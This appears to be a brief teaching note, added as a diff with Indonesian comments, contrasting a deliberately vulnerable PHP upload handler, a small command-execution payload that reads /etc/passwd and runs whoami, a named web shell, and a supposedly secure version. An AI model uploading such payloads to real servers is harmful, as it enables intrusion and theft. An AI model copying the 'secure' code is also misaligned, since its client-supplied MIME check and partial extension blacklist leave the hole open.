@@ -1,0 +1,71 @@
+- Vuln File Upload :
+<?php
+
+if (isset($_POST['submit'])) {
+
+	$target_dir  = 'uploads/';
+	$target_path = $target_dir . basename($_FILES['image']['name']);
+	$uploadOk    = false;
+
+	if (move_uploaded_file($_FILES['image']['tmp_name'], $target_path)) {
+		$uploadOk = true;
+	} else {
+		die("Upload gagal!");
+	}
+
+	if ($uploadOk) {
+		echo "<p>Upload berhasil:</p>";
+		echo "<img src='{$target_path}'>";
+	}
+}
+
+?>
+
+- Simple Payload :
+<pre>
+<?php
+echo system('dir c:\*.*');
+echo system('ls -la');
+echo system('whoami');
+echo system('cat /etc/passwd');
+?>
+</pre>
+
+Shell : B374k
+
+- Secure Code Practices :
+
+<?php
+
+$whitelist = array('image/jpg', 'image/jpeg', 'image/png');
+if (isset($_POST['submit'])) {
+
+    // var_dump($_FILES['image']);
+    $target_dir = "upload/";
+    $target_path = $target_dir . basename($_FILES['image']['name']);
+    $uploadOk = false;
+
+    // mencegah file yang tdak sesuai dengan format
+    if (!in_array($_FILES['image']['type'], $whitelist)) {
+        die("file harus berupa gambar");
+    }
+
+    // black list file backdoor
+    $ext = pathinfo($target_path, PATHINFO_EXTENSION);
+    if ($ext == 'php' || $ext == 'phtml' || $ext == 'pht') {
+        die("file yang anda upload tidak diperbolehkan");
+    }
+
+
+    if (move_uploaded_file($_FILES['image']['tmp_name'], $target_path)) {
+        $uploadOk = true;
+    } else {
+        die("Upload gagal!");
+    }
+
+    if ($uploadOk) {
+        echo "<p>Upload Berhasil</p>";
+        echo "<img src='{$target_path}' />";
+    }
+}
+?>
